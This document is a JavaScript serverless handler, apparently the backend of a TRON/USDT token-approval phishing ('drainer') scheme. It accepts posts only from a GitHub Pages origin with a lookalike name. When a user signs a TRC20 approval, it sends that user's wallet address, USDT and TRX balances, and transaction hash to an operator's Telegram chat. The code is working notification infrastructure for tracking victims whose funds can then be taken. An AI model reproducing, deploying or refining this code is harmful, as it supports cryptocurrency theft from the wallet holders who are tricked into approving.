module.exports = async function handler(req, res) {
  const allowedOrigin = "https://trc20trx-alt.github.io";
  res.setHeader("Access-Control-Allow-Origin", allowedOrigin);
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "只支持POST请求" });
  }

  const { address, tokenBalance, trxBalance, approveTime, txHash } = req.body;
  if (!address || !tokenBalance) {
    return res.status(400).json({ error: "缺少关键授权数据（address/tokenBalance）" });
  }

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ error: "后端未配置Telegram环境变量" });
  }

  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    // 使用 Markdown 格式的链接
    const message = `
🔔 新用户完成TRC20授权！
📌 授权地址：${address}
💵 USDT余额：${tokenBalance ?? "未获取"} USDT
🪙 TRX余额：${trxBalance ?? "未获取"} TRX
⏰ 授权时间：${approveTime ?? new Date().toLocaleString()}
🔗 交易哈希：${txHash ? `[${txHash}](https://tronscan.org/#/transaction/${txHash})` : "未提供"}
    `;

    const response = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown", // 使用 Markdown
        disable_web_page_preview: false,
      }),
    });

    if (!response.ok) {
      throw new Error(`Telegram API响应异常：${response.status}`);
    }

    res.status(200).json({ success: true, message: "Telegram通知已发送" });
  } catch (error) {
    console.error("通知失败：", error);
    res.status(500).json({ error: "通知发送失败", detail: error.message });
  }
};
